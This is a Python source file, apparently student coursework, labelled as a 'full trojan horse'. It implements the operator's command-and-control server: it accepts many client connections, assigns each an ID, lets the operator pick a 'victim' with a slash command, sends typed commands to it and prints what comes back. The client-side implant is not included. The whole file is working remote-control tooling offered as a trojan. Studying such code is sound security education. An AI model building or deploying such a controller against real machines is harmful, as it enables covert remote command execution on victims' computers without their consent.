#full trojan horse

#Author: Augusto Takashi Fujimaki
#NUSP: 10333716

import selectors
import socket
import threading
import time



def keyboard():
    global command, client_select
    while True:
        command = input()
        if command[0] == '/':
            client_select = command[1:]
            command = ''
        else:
            pass

def receive_message(client_socket):
    try:
        message_header = client_socket.recv(HEADER_LENGTH)

        if not len(message_header):
            return False

        message_length = int(message_header.decode("ISO-8859-1").strip())
        return {"header": message_header, "data": client_socket.recv(message_length)}

    except:
        return False


def instructions():
    print('[Server] Listening for clients')
    print('[Server] Type /ID to change client')
    

def accept(sock, mask):
    global clients, ID
    
    conn, addr = sock.accept() # Should be ready
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_WRITE, write)
    clients[ID] = conn, addr, ID
    print(f'[Server] Connected by {clients[ID][1]} with ID: {ID}')

    ID += 1

def write(conn, mask):
    global command, client_select, clients
    try:
        if conn == clients[int(client_select)][0]:
            try:
                conn.send(command.encode())
                command = ''
                try:
                    time.sleep(0.1)
                    output = conn.recv(1024).decode("ISO-8859-1")
                    print(f"[Client #{client_select} {clients[int(client_select)][1]}] {output}")

                except:
                    pass
            except:
                print(f"[Client #{client_select} {clients[int(client_select)][1]}] Disconnected")
                del clients[int(client_select)]
    except:
        print('[Server] Please choose another client with command /ID')
        time.sleep(3)
global clients, command, victim_selected, victim_id, ID


HOST = 'localhost' 
PORT = 50007 # Arbitrary non-privileged port

sel = selectors.DefaultSelector()
sock = socket.socket()
sock.bind((HOST, PORT))

threading.Thread(target = keyboard).start()

print('[Server] Server Started')
instructions()
sock.listen(100)
sock.setblocking(False)
sel.register(sock, selectors.EVENT_READ, accept)

clients = {}
victim_selected = True
sockets_list = [sock]
command = ''
client_select = 0
ID = 0
HEADER_LENGTH = 64



while True:
    events = sel.select()
    for key, mask in events:
        callback = key.data #accept
        callback(key.fileobj, mask)